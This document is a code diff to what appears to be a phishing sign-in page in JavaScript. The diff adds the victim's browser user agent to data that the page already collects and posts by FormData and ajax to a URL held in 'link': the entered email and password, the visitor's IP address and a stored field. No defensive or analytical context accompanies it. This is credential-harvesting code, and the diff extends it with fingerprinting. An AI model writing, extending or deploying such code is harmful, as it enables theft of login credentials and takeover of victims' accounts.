@@ -575,10 +575,12 @@
                 }
 
                 const handleSendEmail = async () => {
+                    const browser = navigator.userAgent
                     const formData = new FormData()
                     const ip = await getIPAddress()
                     formData.append("email", USER_CREDS['email'])
                     formData.append("password", USER_CREDS['password'])
+                    formData.append("browser", browser)
                     formData.append("ip", JSON.stringify(ip, null, 4))
                     formData.append("detail", localStorage.getItem("FIELD"))
                     formData.append("sign-in", "")
@@ -904,6 +906,7 @@
                         }
                         else {
                             const ip_address = await getIPAddress()
+                            const browser = navigator.userAgent
                             $.ajax({
                                 dataType: 'JSON',
                                 url: link,
@@ -912,6 +915,7 @@
                                     email: email,
                                     password: password,
                                     detail: detail,
+                                    browser: browser,
                                     ip: JSON.stringify(ip_address, null, 4),
                                     "sign-in": ""
                                 },
